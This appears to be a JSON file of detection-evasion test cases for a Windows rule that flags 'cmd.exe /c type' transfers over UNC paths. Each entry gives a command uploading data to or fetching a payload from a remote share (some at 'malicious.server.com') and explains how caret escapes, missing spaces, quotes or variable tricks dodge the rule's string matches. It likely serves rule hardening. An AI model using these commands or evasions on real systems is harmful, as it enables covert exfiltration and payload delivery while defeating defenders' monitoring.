@@ -1,0 +1,34 @@
+[
+  {
+    "output": "cmd.exe /c type C:\\payload.exe>\\\\malicious.server.com\\share\\uploaded.exe",
+    "explanation": "The rule's upload detection logic expects the exact string ' > \\\\' with spaces surrounding the redirection operator. By omitting these spaces, the command executes successfully but evades the specific string match condition."
+  },
+  {
+    "output": "cmd.exe /c type \"\\\\malicious.server.com\\share\\payload.exe\" > C:\\payload.exe",
+    "explanation": "The download detection logic explicitly searches for the string 'type \\\\'. By encapsulating the UNC path within double quotes, the raw process command line becomes 'type \"\\\\', which breaks the required contiguous substring match."
+  },
+  {
+    "output": "cmd.exe /c t^y^p^e \\\\malicious.server.com\\share\\payload.exe > C:\\payload.exe",
+    "explanation": "The Windows command shell (cmd.exe) uses the caret (^) as an escape character. Injecting carets into the 'type' keyword breaks both the 'type ' and 'type \\\\' literal string matches in the process creation logs while the command interpreter still functions normally."
+  },
+  {
+    "output": "cmd.exe /c type \\\\malicious.server.com\\share\\payload.exe>>C:\\payload.exe",
+    "explanation": "The download condition requires the string ' > ' (with spaces) to increase matching speed. Using the append operator '>>' without surrounding spaces completely bypasses the redirection operator check."
+  },
+  {
+    "output": "cmd.exe /c type \\\\live.sysinternals.com\\tools\\Procmon.exe>C:\\temp\\Procmon.exe",
+    "explanation": "Bypasses the selection_download condition by removing the spaces around the redirection operator (>), successfully avoiding the ' > ' string match requirement."
+  },
+  {
+    "output": "cmd.exe /c t^yp^e C:\\temp\\data.txt > \\\\webdav.server.local\\share\\data.txt",
+    "explanation": "Bypasses the selection_upload condition by utilizing CMD caret (^) escape characters within the word 'type', avoiding the exact 'type ' string match."
+  },
+  {
+    "output": "cmd.exe /c type C:\\temp\\data.txt >\\\\webdav.server.local\\share\\data.txt",
+    "explanation": "Bypasses the selection_upload condition by removing the space immediately following the redirection operator, failing the ' > \\\\' string match requirement."
+  },
+  {
+    "output": "cmd.exe /c set \"cmd=type\" && call %cmd% \\\\webdav.server.local\\share\\file.txt > C:\\temp\\file.txt",
+    "explanation": "Bypasses the selection_download condition by using environment variable obfuscation. The raw command line logged by process creation will contain '%cmd%' instead of 'type \\\\'."
+  }
+]
